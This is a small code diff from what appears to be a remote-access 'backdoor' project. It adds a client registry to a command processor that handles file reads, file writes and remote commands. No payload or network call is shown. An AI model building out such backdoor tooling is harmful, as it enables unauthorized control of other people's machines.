@@ -3,13 +3,17 @@ import sys
 
 from backdoor.files.io import FileReader, FileWriter
 from backdoor.models.commands import Command, RemoteCommand, CommandResult
+from backdoor.server.registry import ClientRegistry
 
 
 class CommandProcessor:
 
-    def __init__(self, file_writer: FileWriter, file_reader: FileReader) -> None:
+    def __init__(
+        self, file_writer: FileWriter, file_reader: FileReader, registry: ClientRegistry
+    ) -> None:
         self.file_writer = file_writer
         self.file_reader = file_reader
+        self.registry = registry
 
     def pre_process(self, command: Command) -> None:
         match command:
